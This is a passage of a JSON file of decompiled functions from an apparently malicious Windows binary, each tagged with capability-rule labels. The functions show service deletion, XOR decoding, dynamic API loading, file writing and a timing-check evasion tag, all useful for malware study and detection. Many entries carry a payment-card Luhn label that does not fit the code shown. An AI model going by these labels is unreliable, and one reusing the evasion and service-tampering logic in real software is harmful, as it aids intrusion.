        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404275) overlaps instruction at (ram,0x00404273)\n// \n\nvoid __cdecl fcn.00404220(uint *arg_8h, uint *arg_ch)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uchar *arg_8h_00;\n    uint8_t extraout_CH;\n    int32_t iVar4;\n    uint32_t in_EDX;\n    uint arg_ch_00;\n    uint *puVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint in_stack_ffffff80;\n    uint arg_14h;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar5 = &fcn.00404220::var_67h;\n    for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar6 = (in_EDX ^ 0x6de) < 0;\n    arg_14h = 0x404267;\n    uVar7 = fcn.00404040(&stack0xffffff94, &fcn.00404220::var_4h);\n    if ((bVar6) || (!bVar6)) {\n        arg_14h = 0x14000;\n        in_stack_ffffff80 = 0x411564;\n        arg_8h_00 = &stack0xffffff94;\n        arg_ch_00 = var_4h;\n    }\n    else {\n        pcVar1 = uVar7 + 0x68fc558c;\n        *pcVar1 = *pcVar1 + uVar7 + -0x75;\n        puVar2 = uVar7 + 0x68fc55ef;\n        uVar3 = *puVar2;\n        *puVar2 = *puVar2 + extraout_CH;\n        arg_8h_00 = uVar7 + 0x55cc + CARRY1(uVar3, extraout_CH);\n        arg_ch_00 = uVar7 >> 0x20;\n    }\n    fcn.004014c0(arg_8h_00, arg_ch_00, in_stack_ffffff80, arg_14h);\n    *arg_8h = 0x411564;\n    *arg_ch = 0x14000;\n    return;\n}\n",
        "token_count": 592
    },
    "004043c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a4e) overlaps instruction at (ram,0x00404a4c)\n// \n// WARNING: Removing unreachable block (ram,0x00404485)\n// WARNING: Removing unreachable block (ram,0x0040448a)\n\nint32_t fcn.004043c0(void)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    code cVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    char *pcVar11;\n    uint8_t extraout_CL;\n    uint16_t extraout_CX;\n    ushort extraout_CX_00;\n    char extraout_CH_00;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    int16_t extraout_DX_00;\n    uint32_t uVar12;\n    int32_t extraout_EDX;\n    uint8_t uVar14;\n    uint8_t *unaff_EBX;\n    uint8_t *puVar13;\n    uint16_t uVar15;\n    int16_t iVar16;\n    int32_t unaff_EBP;\n    uint *puVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uint32_t *puVar20;\n    uint *puVar21;\n    ushort in_ES;\n    ushort in_SS;\n    ushort in_DS;\n    uchar uVar22;\n    uint8_t in_AF;\n    bool bVar23;\n    uchar uVar24;\n    bool bVar25;\n    char cVar26;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar27;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar28;\n    ulong uVar29;\n    uint64_t uVar30;\n    uint in_stack_ffffff95;\n    uint in_stack_ffffff99;\n    uint in_stack_ffffff9d;\n    unkbyte3 Var31;\n    uint uVar32;\n    uint arg_10h;\n    ushort in_stack_ffffffb1;\n    ushort uVar33;\n    uchar uVar34;\n    uchar uVar35;\n    uchar uVar36;\n    uint16_t uVar37;\n    \n    uVar8 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    puVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (uVar8 == 0) {\n        return 0;\n    }\n    uVar7 = unaff_EBX;\n    cVar27 = '\\0';\n    cVar26 = (uVar7 ^ extraout_CX) < 0;\n    uVar28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uVar12 = uVar28 >> 0x20;\n    iVar10 = uVar28;\n    *0x4255a4 = iVar10;\n    if ((cVar27 == cVar26) && (cVar27 != cVar26)) {\n        pcVar11 = uVar8 - 1;\n        *pcVar11 = *pcVar11 + uVar28;\n        cVar26 = *pcVar11 < '\\0';\n        uVar28 = CONCAT44(iVar10, uVar12 & 0xffffff00 | unaff_EBX[uVar12 & 0xff]);\n    }\n    else {\n        uVar28 = (*puVar4)();\n    }\n    iVar10 = uVar28;\n    *0x4255a8 = iVar10;\n    if ((cVar26) || (!cVar26)) {\n        *0x4255ac = (*puVar4)();\ncode_r0x00404426:\n        if (((*0x4255a4 != 0) && (*0x4255a8 != 0)) && (*0x4255ac != 0)) {\n            return 1;\n        }\n        return 0;\n    }\n    puVar9 = iVar10 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    iVar3 = *(uVar8 + 0x40);\n    if (SBORROW4(iVar3, unaff_EBP)) {\n        *(iVar10 + -0x1bf31dd7) = *(iVar10 + -0x1bf31dd7) + (uVar28 >> 0x20);\n        *0x4255ac = uVar8 & 0xffffff00 | unaff_EBX[uVar8 & 0xff];\n        goto code_r0x00404426;\n    }\n    puVar20 = puVar4;\n    if ((unaff_EBP <= iVar3) && (iVar3 < unaff_EBP)) {\n        out(0xc4, uVar8);\n        puVar20 = puVar4 + 1;\n        *puVar4 = uVar8;\n    }\n    fcn.00401000(0x411550, 0xd, 0x407024, 10);\n    uVar8 = (unaff_EBX >> 8 & 0xffff00) << 8;\n    fcn.00401000(0x411550, 0xd, 0x407030, 0x12);\n    uVar14 = ((uVar7 ^ puVar9) >> 8) - 1;\n    bVar23 = (uVar14 & 0xd) == 0;\n    uVar22 = (POPCOUNT(uVar14 & 0xd) & 1U) == 0;\n    uVar12 = CONCAT12(uVar8 >> 0x10, uVar7);\n    fcn.00401000(0x411550, 0xd, 0x407044, 4);\n    if ((!bVar23) && (bVar23)) {\n        uVar22 = (POPCOUNT(&stack0xffffffc9 & 0xff) & 1U) == 0;\n    }\n    uVar33 = 0x4508;\n    uVar28 = fcn.00401000(0x411550, 0xd, 0x407048, 0xc);\n    pcVar11 = uVar28 >> 0x20;\n    uVar32 = uVar28;\n    if (uVar22) {\ncode_r0x0040451f:\n        uVar33 = 7;\n        uVar24 = 0;\n        uVar34 = 0;\n    }\n    else {\n        uVar24 = SUB41(puVar9, 0);\n        uVar34 = puVar9 >> 8;\n        if (!uVar22) goto code_r0x0040451f;\n        out(*puVar9, uVar28 >> 0x20);\n        do {\n            cVar26 = uVar32 >> 8;\n            in_AF = 9 < (uVar32 & 0xf) | in_AF;\n            uVar32 = CONCAT31(CONCAT21(uVar32 >> 0x10, cVar26 - in_AF), -in_AF);\n        } while (in_AF || cVar26 == *pcVar11);\n        piVar2 = puVar20 + pcVar11 * 2;\n        *piVar2 = (*piVar2 + 0x7b) - in_AF;\n        *(extraout_ECX + 0x6a) = uVar32;\n        puVar9 = iVar10 + -0x1bf31dd2;\n        in_ES = in_stack_ffffffb1;\n    }\n    fcn.00401000(0x411550, 0xd, 0x407054, CONCAT13(uVar34, CONCAT12(uVar24, uVar33)));\n    bVar23 = false;\n    uVar15 = uVar7 & 0xff | (uVar12 >> 8) << 8;\n    uVar8 = uVar8 & 0xff000000 | uVar12 & 0xffff0000;\n    cVar5 = fcn.00401000(0x411550, 0xd, 0x40705c, 0xb);\n    if (!bVar23) {\n        puVar20 = puVar20 & 0xffff0000 | puVar20 & 0xff | (puVar20 >> 8) << 8;\n    }\n    puVar21 = puVar20 + 1;\n    cVar26 = cVar5 - *puVar20;\n    uVar37 = (in_NT & 1) * 0x4000 | SBORROW1(cVar5, *puVar20) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar26 < '\\0') * 0x80 | (cVar26 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar26) & 1U) == 0) * 4\n             | cVar5 < *puVar20;\n    uVar14 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n             (in_AC & 1) * 0x40000 >> 0x10;\n    uVar22 = 0;\n    puVar18 = puVar9 + -1;\n    puVar19 = &stack0xffffffc1;\n    uVar28 = func_0x1018a4e5();\n    bVar23 = (*(uVar28 + -0x7f + (uVar8 | uVar15)) & 0x4b) == 0;\n    puVar17 = (uVar28 >> 0x20) + 0xc;\n    fcn.00401000(0x411550, 0xd, 0x407068, CONCAT13(uVar22, CONCAT12(uVar14, uVar37)));\n    if ((!bVar23) && (bVar23)) {\n        out(*puVar18, extraout_DX);\n        puVar18 = puVar9;\n    }\n    fcn.00401000(0x411550, 0xd, 0x407074, 8);\n    fcn.00401000(0x411550, 0xd, 0x40707c, 0xd);\n    fcn.00401000(0x411550, 0xd, 0x40708c, 0x18);\n    fcn.00401000(0x411550, 0xd, 0x4070a4, 0x25);\n    uVar37 = fcn.00401000(0x411550, 0xd, 0x4070cc, 10);\n    uVar22 = 0;\n    uVar24 = (uVar37 & 0x11cb) == 0;\n    bVar23 = (POPCOUNT(uVar37 & 0xcb) & 1U) == 0;\n    fcn.00401000(0x411550, 0xd, 0x4070d8, 0xc);\n    if ((!bVar23) && (bVar23)) {\n        cVar26 = '\\x1e';\n        do {\n            puVar17 = puVar17 + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *puVar17;\n            cVar26 = cVar26 + -1;\n        } while ('\\0' < cVar26);\n        iVar10 = in(0x78);\n        return iVar10;\n    }\n    uVar34 = 0x40;\n    uVar35 = 0;\n    fcn.00401000(0x411550, 0xd, 0x4070e4, 0xd);\n    if ((uVar22 || uVar24) || (!uVar22 && !uVar24)) {\n        in_ES = 6;\n        uVar34 = 0;\n        uVar35 = 0;\n    }\n    else {\n        *puVar21 = *puVar18;\n        uVar15 = CONCAT11(0xdf, uVar7 & 0xff);\n        puVar17 = 0x6ae181d0;\n        puVar18 = puVar18 + 1;\n        puVar21 = puVar20 + 5;\n    }\n    puVar13 = uVar8 | uVar15;\n    arg_10h = 0x4070f4;\n    uVar32 = 0xd;\n    fcn.00401000(0x411550, 0xd, 0x4070f4, CONCAT13(uVar35, CONCAT12(uVar34, in_ES)));\n    uVar22 = 0;\n    fcn.00401000(0x411550, 0xd, 0x4070fc, 5);\n    iVar6 = 0xd;\n    uVar24 = 0;\n    uVar34 = 0;\n    uVar28 = fcn.00401000(0x411550, 0xd, 0x407104, 0xd);\n    iVar10 = uVar28 >> 0x20;\n    uVar14 = extraout_ECX_00 >> 8;\n    if (uVar22) {\ncode_r0x0040474f:\n        uVar33 = 0x19;\n        uVar35 = 0;\n        uVar36 = 0;\n        arg_10h = 0x407114;\n        uVar32 = 0xd;\n        puVar9 = puVar21;\ncode_r0x00404755:\n        *(iVar10 + 0xd) = *(iVar10 + 0xd) + uVar14;\n        fcn.00401000(0x411550, uVar32, arg_10h, CONCAT13(uVar36, CONCAT12(uVar35, uVar33)));\n        iVar6 = puVar9;\n        bVar23 = iVar6 == 0;\n        uVar29 = fcn.00401000(0x411550, 0xd, 0x407130, 0xf);\n        iVar10 = uVar29 >> 0x20;\n        uVar14 = extraout_CH;\n        if (!bVar23) {\n            uVar24 = puVar9 >> 0x10;\n            uVar34 = puVar9 >> 0x18;\n            puVar19 = puVar18;\n            if (bVar23) goto code_r0x004047ab;\n        }\n        iVar6 = 0xe;\n        uVar24 = 0;\n        uVar34 = 0;\ncode_r0x004047af:\n        *(iVar10 + 0xe) = *(iVar10 + 0xe) ^ uVar14;\n        fcn.00401000(0x411550, 0xd, 0x407140, CONCAT13(uVar34, CONCAT12(uVar24, iVar6)));\n        fcn.00401000(0x411550, 0xd, 0x407150, 0xb);\n        uVar22 = extraout_CL < extraout_DL;\n        cVar26 = extraout_CL == 1;\n        fcn.00401000(0x411550, 0xd, 0x40715c, 0xb);\n        puVar17 = puVar9;\n        puVar19 = puVar18;\n    }\n    else {\n        uVar33 = extraout_ECX_00;\n        uVar35 = extraout_ECX_00 >> 0x10;\n        uVar36 = extraout_ECX_00 >> 0x18;\n        if (!uVar22) goto code_r0x0040474f;\n        pcVar11 = uVar28 + 1;\n        puVar19 = puVar18 + 1;\n        *puVar21 = *puVar18;\n        iVar10 = 0x1468196a;\n        uVar29 = CONCAT44(0x1468196a, pcVar11);\n        puVar18 = puVar19;\n        puVar9 = puVar21 + 1;\n        if (SCARRY4(uVar28, 1)) goto code_r0x00404755;\n        uVar15 = *0x10 - 0x4f;\n        puVar4 = segment(in_SS, uVar15);\n        *puVar4 = puVar17 & 0xffff;\n        iVar16 = puVar17;\n        cVar26 = '\\x0e';\n        uVar7 = uVar15;\n        do {\n            iVar16 = iVar16 + -4;\n            puVar9 = segment(in_DS, iVar16);\n            uVar7 = uVar7 - 4;\n            puVar17 = segment(in_SS, uVar7);\n            *puVar17 = *puVar9;\n            cVar26 = cVar26 + -1;\n        } while ('\\0' < cVar26);\n        puVar4 = segment(in_SS, *0x10 + -0x8b);\n        *puVar4 = uVar15;\n        *pcVar11 = *pcVar11 + pcVar11;\n        *(puVar21 + 0x6a) = *(puVar21 + 0x6a) + 'j';\n        puVar9 = 0xf5f9ce2;\n        *pcVar11 = *pcVar11 + pcVar11;\ncode_r0x004047ab:\n        iVar10 = uVar29 >> 0x20;\n        puVar17 = puVar9 + 1;\n        uVar32 = in(uVar29 >> 0x20);\n        *puVar9 = uVar32;\n        puVar18 = puVar19;\n        puVar9 = puVar17;\n        if (0 < &stack0xffffffc2) goto code_r0x004047af;\n        puVar1 = puVar19 + -0x79127501;\n        uVar22 = CARRY1(*puVar1, uVar29);\n        *puVar1 = *puVar1 + uVar29;\n        cVar26 = *puVar1 == 0;\n    }\n    do {\n        fcn.00401000(0x411550, 0xd, 0x407168, 0x411550);\n        if ((uVar22) || (!uVar22)) {\n            *(extraout_EDX + 0xd) = *(extraout_EDX + 0xd) + (extraout_ECX_01 >> 8);\n            iVar6 = fcn.00401000(0x411550, in_stack_ffffff95, in_stack_ffffff99, in_stack_ffffff9d);\n            bVar23 = false;\n            uVar22 = iVar6 + 1 < 0;\n            bVar25 = iVar6 == -1;\n            fcn.00401000(0x411550, 0x4115, 0x407180, 0xc);\n            if ((!bVar23 && !bVar25) && (bVar23 || bVar25)) {\n                uVar22 = &stack0xffffffb4 < 0;\n            }\n            goto code_r0x004048a1;\n        }\n    } while (extraout_ECX_01 != 1 && cVar26 != '\\0');\n    *puVar17 = puVar19 + 1;\n    uVar22 = &stack0xffffffb4 < 0;\ncode_r0x004048a1:\n    uVar24 = 0xb4;\n    Var31 = 0x4048;\n    iVar10 = fcn.00401000(0x411550, 0xd, 0x40718c, 0xe);\n    if ((uVar22) || (!uVar22)) {\n        uVar24 = 0x11;\n        Var31 = 0;\n    }\n    *puVar13 = *puVar13 & 0xc3;\n    iVar6 = fcn.00401000(0x411550, 0xd, 0x40719c, CONCAT31(Var31, uVar24));\n    cVar27 = false;\n    uVar7 = puVar17 & (extraout_DX_00 - iVar6) + 0x1abU;\n    cVar26 = uVar7 < 0;\n    uVar22 = uVar7 == 0;\n    fcn.00401000(0x411550, 0xd, 0x4071b0, 0x13);\n    if ((!cVar27) && (cVar27)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar28 = fcn.00401000(0x411550, 0xd, 0x4071c4, 0x14);\n    if ((!uVar22 && cVar27 == cVar26) && (uVar22 || cVar27 != cVar26)) {\n        puVar13 = uVar28 + 0x6a39da56;\n        *puVar13 = *puVar13 ^ extraout_CX_00;\n        return uVar28;\n    }\n    pcVar11 = (uVar28 >> 0x20) + 0xd;\n    *pcVar11 = *pcVar11 + (extraout_CX_00 >> 8);\n    fcn.00401000(0x411550, 0xd, 0x4071d8, 0x33);\n    fcn.00401000(0x411550, 0xd, 0x40720c, 10);\n    uVar8 = iVar10 + 0xe40ce22aU & 0xffff0000 | iVar10 + 0xe40ce22aU + 1;\n    bVar23 = uVar8 < 0x222c;\n    bVar25 = uVar8 == 0x222c;\n    uVar8 = fcn.00401000(0x411550, 0xd, 0x407218, 4);\n    if ((!bVar25) && (bVar25)) {\n        puVar13 = puVar13 + 1;\n        if (bVar23 || puVar13 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        in_AF = 9 < (uVar8 & 0xf) | in_AF;\n        piVar2 = (uVar8 & 0xffff0000 | CONCAT11((uVar8 >> 8) + in_AF, uVar8 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar2 = *piVar2 - puVar13;\n    }\n    uVar8 = 0x5004072;\n    uVar24 = 0x1c;\n    Var31 = 0;\n    uVar22 = 0xd;\n    fcn.00401000(0x411550, 0xd, 0x40721c, 5);\n    uVar8 = uVar8 & 0xffffff;\n    fcn.00401000(0x411550, 0xd, 0x407224, 6);\n    uVar7 = puVar17 + 0x2562;\n    cVar27 = '\\0';\n    cVar26 = (uVar7 & 0xffffff00 | uVar7 | 0x4c | extraout_ECX_02) < 0;\n    uVar8 = uVar8 & 0xffffff;\n    uVar30 = fcn.00401000(0x411550, 0xd, 0x407258, 0x2a);\n    iVar10 = uVar30 >> 0x20;\n    if (cVar27 == cVar26) {\n        uVar8 = uVar8 & 0xffffff | puVar13 << 0x18;\n        uVar33 = puVar13 >> 8;\n        uVar34 = puVar13 >> 0x18;\n        if (cVar27 != cVar26) {\n            iVar10 = uVar30;\n            if (uVar30 < 0x84680b6a00000000) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x00404a54;\n        }\n    }\n    uVar33 = 0;\n    uVar34 = 0;\n    uVar8 = 0xb004072;\n    uVar22 = 0xd;\n    uVar24 = 0x84;\n    Var31 = 0;\ncode_r0x00404a54:\n    *(iVar10 + 0xd) = *(iVar10 + 0xd) + extraout_CH_00;\n    iVar10 = fcn.00401000(0x411550, CONCAT31(Var31, uVar22), CONCAT31(uVar8, uVar24), \n                          CONCAT13(uVar34, CONCAT21(uVar33, uVar8 >> 0x18)));\n    return iVar10;\n}\n",
        "token_count": 5606
    },
    "00401250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401250(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 142
    },
    "004012e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401312)\n\nuint __cdecl fcn.004012e0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 147
    },
    "004014c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004014c0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "004017c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004017c0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040308a) overlaps instruction at (ram,0x00403086)\n// \n\nuint __cdecl fcn.00403070(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint hSCManager;\n    uint uVar1;\n    ushort in_CX;\n    char cVar2;\n    int32_t *in_EDX;\n    char *unaff_EDI;\n    bool bVar3;\n    unkbyte10 in_ST0;\n    \n    *(in_EAX + -0x7ce92414) = in_ST0;\n    *in_EDX = *in_EDX + 0x3f68df84;\n    *unaff_EDI = *unaff_EDI + in_CX;\n    cVar2 = in_CX >> 8;\n    bVar3 = SCARRY1(*in_EDX, cVar2);\n    *in_EDX = *in_EDX + cVar2;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    if ((!bVar3) && (bVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00401250(hSCManager, arg_8h);\n    uVar1 = fcn.00403210(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 344
    },
    "00403570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00403570(uint8_t *arg_8h, uint32_t arg_ch, uint8_t *arg_10h, int32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t **unaff_EDI;\n    uint8_t *puVar5;\n    bool bVar6;\n    \n    puVar3 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return CONCAT44(arg_ch, arg_8h);\n    }\n    puVar1 = arg_8h;\n    if (arg_8h <= puVar3) {\n        do {\n            if ((!SBORROW4(puVar1, puVar3)) && (SBORROW4(puVar1, puVar3))) {\n                *unaff_EDI = arg_10h;\n                return CONCAT44(arg_8h, arg_10h);\n            }\n            arg_ch = arg_ch & 0xffffff00 | *arg_10h;\n            if (*puVar1 == *arg_10h) {\n                arg_ch = 0;\n                bVar6 = true;\n                iVar2 = arg_14h;\n                puVar4 = puVar1;\n                puVar5 = arg_10h;\n                do {\n                    puVar5 = puVar5 + 1;\n                    puVar4 = puVar4 + 1;\n                    iVar2 = iVar2 + -1;\n                    if (iVar2 == 0) break;\n                    bVar6 = *puVar4 == *puVar5;\n                } while (bVar6);\n                if (bVar6) goto code_r0x004035f5;\n            }\n            puVar1 = puVar1 + 1;\n        } while (puVar1 <= puVar3);\n    }\n    puVar1 = NULL;\ncode_r0x004035f5:\n    return CONCAT44(arg_ch, puVar1);\n}\n",
        "token_count": 452
    },
    "00403600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403677) overlaps instruction at (ram,0x00403676)\n// \n\nvoid fcn.00403600(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint32_t unaff_EBX;\n    uchar *puVar7;\n    uchar *unaff_ESI;\n    uchar *puVar8;\n    int16_t unaff_DI;\n    bool bVar9;\n    int32_t in_stack_00000010;\n    uint8_t uStack5;\n    \n    puVar7 = &stack0xfffffffc;\n    if (0 < in_stack_00000010) {\n        do {\n            iVar3 = *(puVar7 + -0xc);\n            uVar1 = *(iVar3 + *(puVar7 + 0x10));\n            puVar7[-1] = uVar1;\n            if ((unaff_DI < 2) || (1 < unaff_DI)) {\n                iVar3 = *(puVar7 + -8);\n            }\n            else {\n                unaff_EBX = unaff_EBX + 1;\n                *(iVar3 + -0x74c625aa) = *(iVar3 + -0x74c625aa) ^ uVar1;\n                puVar7 = puVar7 + 1;\n            }\n            iVar4 = *(puVar7 + 8);\n            puVar7[-2] = *(iVar3 % *(puVar7 + 0xc) + iVar4);\n            bVar9 = (POPCOUNT(iVar4 + 1U & 0xff) & 1U) == 0;\n            if ((bVar9) || (!bVar9)) {\n                iVar4 = *(puVar7 + -8) + -1;\n            }\n            *(unaff_EBX + 0x428df855) = 0xffffffff;\n            iVar3 = *(puVar7 + 0xc);\n            puVar7[-1] = puVar7[-1] ^ *(iVar4 % iVar3 + *(puVar7 + 8));\n            uVar1 = puVar7[-0x10];\n            iVar2 = *(puVar7 + 0x18);\n            uVar6 = uVar1 ^ puVar7[-1];\n            uVar5 = *(puVar7 + -8);\n            *(iVar2 + -1 + uVar5) = uVar6;\n            puVar8 = unaff_ESI;\n            if ((uVar6 != 0) && (uVar6 == 0)) {\n                uVar5 = uVar5 & 0xffffff00 | *0x4bb148d3;\n                puVar8 = unaff_ESI + 1;\n                out(*unaff_ESI, iVar4 % iVar3 & 0xff00 | uVar1);\n            }\n            unaff_EBX = unaff_EBX & 0xffffff00 | puVar7[-2];\n            *(puVar7 + -8) = uVar5 + 2;\n            *(uVar5 + iVar2) = uVar1 ^ puVar7[-2];\n            iVar3 = *(puVar7 + -0xc);\n            *(puVar7 + -0xc) = iVar3 + 1;\n            unaff_ESI = puVar8;\n        } while (iVar3 + 1 < *(puVar7 + 0x14));\n    }\n    return;\n}\n",
        "token_count": 764
    },
    "00403720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403677) overlaps instruction at (ram,0x00403676)\n// \n// WARNING: Removing unreachable block (ram,0x00403737)\n// WARNING: Removing unreachable block (ram,0x0040373f)\n// WARNING: Removing unreachable block (ram,0x00403742)\n// WARNING: Removing unreachable block (ram,0x004036c3)\n// WARNING: Removing unreachable block (ram,0x004036c5)\n// WARNING: Removing unreachable block (ram,0x004036dc)\n// WARNING: Removing unreachable block (ram,0x004036e8)\n// WARNING: Removing unreachable block (ram,0x004036ee)\n// WARNING: Removing unreachable block (ram,0x0040370f)\n// WARNING: Removing unreachable block (ram,0x00403628)\n// WARNING: Removing unreachable block (ram,0x00403648)\n// WARNING: Removing unreachable block (ram,0x00403654)\n// WARNING: Removing unreachable block (ram,0x0040364e)\n// WARNING: Removing unreachable block (ram,0x00403657)\n// WARNING: Removing unreachable block (ram,0x0040366d)\n// WARNING: Removing unreachable block (ram,0x00403677)\n// WARNING: Removing unreachable block (ram,0x00403676)\n\nvoid fcn.00403720(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4255a0 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)();\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4255a0 = 1;\n    }\n    return;\n}\n",
        "token_count": 373
    },
    "00403770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403770(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.004027c0(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "00403c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nbool __cdecl fcn.00403c60(uint arg_8h)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    bool in_CF;\n    \n    if (!in_CF) {\n        if (in_CF) {\n            if (&stack0xfffffffc < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (unaff_EDI == -1) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n            return true;\n        }\n    }\n    iVar1 = fcn.00403ca0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 178
    },
    "00405070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
